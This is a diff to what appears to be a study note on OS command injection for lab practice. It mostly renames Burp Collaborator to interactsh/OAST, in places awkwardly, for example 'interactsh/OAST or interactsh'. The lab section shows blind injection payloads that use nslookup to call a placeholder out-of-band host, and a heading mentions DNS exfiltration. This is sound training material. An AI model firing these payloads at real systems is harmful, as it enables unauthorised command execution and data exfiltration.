@@ -102,7 +102,7 @@ Measure the HTTP response time. A consistent delay confirms blind injection.
 
 ### 5. Blind command injection — OOB data exfiltration
 
-Exfiltrate data via DNS (requires Burp Collaborator or interactsh):
+Exfiltrate data via DNS (requires interactsh/OAST or interactsh):
 
 ```bash
 # Linux — nslookup with embedded command output
@@ -458,8 +458,8 @@ An attacker with the ability to push to the repository could re-upload a modifie
 
 ## Tools
 
-- [[burp-suite]] — intercept requests, test blind injection via Collaborator (OOB DNS/HTTP)
-- `interactsh` / Burp Collaborator — OOB callback server for blind injection detection
+- [[caido]] — intercept and resend requests; for blind injection use an OOB service (interactsh, or Burp Collaborator) for OOB DNS/HTTP
+- `interactsh` / interactsh/OAST — OOB callback server for blind injection detection
 - Manual testing via `curl` or browser developer tools
 
 ```bash
@@ -567,7 +567,7 @@ Key insight: look for any existing file-serving endpoint (images, downloads, sta
 
 ### Lab 4 — Blind OS command injection with out-of-band interaction (Practitioner)
 
-No output or time delay is observable. Use Burp Collaborator to receive an OOB DNS callback confirming execution.
+No output or time delay is observable. Use interactsh/OAST to receive an OOB DNS callback confirming execution.
 
 ```bash
 # email parameter — triggers DNS lookup to Collaborator domain
@@ -577,7 +577,7 @@ email=x||nslookup+COLLABORATOR.oastify.com||
 email=x$(nslookup COLLABORATOR.oastify.com)
 ```
 
-Confirm by observing a DNS interaction appear in the Burp Collaborator tab.
+Confirm by observing a DNS interaction appear in the interactsh/OAST tab.
 
 ---
 
